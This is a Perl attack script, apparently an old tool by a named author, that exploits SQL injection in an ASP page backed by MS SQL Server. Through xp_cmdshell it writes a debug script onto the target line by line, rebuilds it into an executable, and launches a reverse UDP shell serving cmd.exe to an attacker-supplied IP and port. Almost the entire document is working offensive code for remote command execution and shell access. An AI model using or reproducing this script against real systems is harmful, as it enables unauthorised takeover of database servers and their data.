#!/usr/bin/perl
# 
# Perl script to upload a debug script via SQL injection.
# This technique is required when TFTP or FTP aren't available due to egress 
# filtering (outbound firewall security).
#
#	
#	Based On Ollie's (@stake) Hack FAQ.
#	Example UDP Reverse Shell via SQL injection
#
#	Author: Gary O'leary-Steele (Sec-1 / Uncon)
#
#
#	THIS IS A HACKED VERSION OF AN OLD SCRIPT
#	FOR AUTOMAGICAL SQL TOOL
#
#


# <-------------Variables------------->

	$postto = 'GET /dynamic/atoz.asp?*** HTTP/1.1';	# The vulnerable file
		#Changed to signify quote or no quote

# <-----------End Variables----------->



sub uploadshell{
use Socket;

$vuln_post_str = $qt . ";";
@ul_vars=@_;

$httpstruct =$ul_vars[0];	# get the HTTP request the structure
$fileis =$ul_vars[1];	# the file to uload

	my $command; $|=1;


	print "Enter your IP address:";
	$myip = <STDIN>;chomp $myip;
	print "Enter you listener port:";
	$myport = <STDIN>;chomp $myport;


#my $target = inet_aton($host);
	open (HEX,$fileis);

print("Uploading debug script file to $host:$port\n",);

	$lines = 0;

while (<HEX>) {
	 $lines++;
 	chomp;
 	
$command = "+exec+master..xp_cmdshell+'echo " . $_ . ' >>c:\shell2.scr';

$postinfo = $vuln_post_str.$command ."'--"; # This is the posted SQL injection string


$postinfo=~s/ /+/g;
$postinfo=~s/'/%27/g;
$postinfo=~s/>/%3E/g;
$postinfo=~s/:/%3A/g;
$postinfo=~s/\\/%5C/g;

 
$httprequest = $httpstruct;
$httprequest=~s/QUERYHERE/$postinfo/g;


		$pst_len=length($postinfo);		# Inserts length of post for POSTS
		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
		$httprequest=~s/REPLACEME/$pst_len/g;	# 

#print $httprequest;

 	@results=sendraw("$httprequest");
	print"$lines\r";
}
 

close(HEX);

#################################################
#	Call debug and extract .com file        #
#						#



$command = " exec master..xp_cmdshell 'debug < c:\\shell2.scr'";
$postinfo = $vuln_post_str.$command .";--"; # This is the posted SQL injection string


$postinfo=~s/ /%20/g;
$postinfo=~s/'/%27/g;
$postinfo=~s/>/%3E/g;
$postinfo=~s/</%3C/g;
$postinfo=~s/:/%3A/g;
$postinfo=~s/\\/%5C/g;


$httprequest = $httpstruct;
$httprequest=~s/QUERYHERE/$postinfo/g;

		$pst_len=length($postinfo);		# Inserts length of post for POSTS
		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
		$httprequest=~s/REPLACEME/$pst_len/g;	# 

@results=sendraw("$httprequest");



print "Waiting for Debug to do its work..5 seconds...\n";

for($i;$i<5;$i++){
print $i ."\r";
sleep(1);
}

#################################################
#		Copy .com to .exe		#
#						#



$command = " exec master..xp_cmdshell 'copy ru.com revudp.exe'";
$postinfo = $vuln_post_str.$command .";--"; # This is the posted SQL injection string



$postinfo=~s/ /+/g;
$postinfo=~s/'/%27/g;
$postinfo=~s/>/%3E/g;
$postinfo=~s/</%3C/g;
$postinfo=~s/:/%3A/g;
$postinfo=~s/\\/%5C/g;


$postto=~s/\*\*\*/$postinfo/g;



$httprequest = $httpstruct;
$httprequest=~s/QUERYHERE/$postinfo/g;

		$pst_len=length($postinfo);		# Inserts length of post for POSTS
		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
		$httprequest=~s/REPLACEME/$pst_len/g;	# 

@results=sendraw("$httprequest");




#################################################
#	Execute Reverse UDP shell	        #
#						#



$command = " exec master..xp_cmdshell 'revudp.exe " .$myip ." " . $myport . " " . "cmd.exe";
$postinfo =$vuln_post_str. $command ."'--"; # This is the posted SQL injection string



$postinfo=~s/ /+/g;
$postinfo=~s/'/%27/g;
$postinfo=~s/>/%3E/g;
$postinfo=~s/</%3C/g;
$postinfo=~s/:/%3A/g;
$postinfo=~s/\\/%5C/g;


$httprequest = $httpstruct;
$httprequest=~s/QUERYHERE/$postinfo/g;
		$pst_len=length($postinfo);		# Inserts length of post for POSTS
		$pst_len=$pst_len + $POST_LENGTH;	# $POST_LENGTH is set in template include
		$pst_len=$pst_len - 7;			# alinement. PLEASE CHECK THIS
		$httprequest=~s/REPLACEME/$pst_len/g;	# 

#print $httprequest;
@results=sendraw("$httprequest");

}

# -------------sendraw - borrowed from Rain Forest Puppy, cheers
sub sendraw {
 my ($pstr)=@_;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("socket problems\n");
 if(connect(S,pack "SnA4x8",2,$port,$target)){
  my @in="";
  select(S); $|=1; print $pstr;
  while(<S>) {
   push @in,$_; last if ($line=~ /^[\r\n]+$/ );}
  select(STDOUT); return @in;
 } else { die("connect problems\n"); }
}
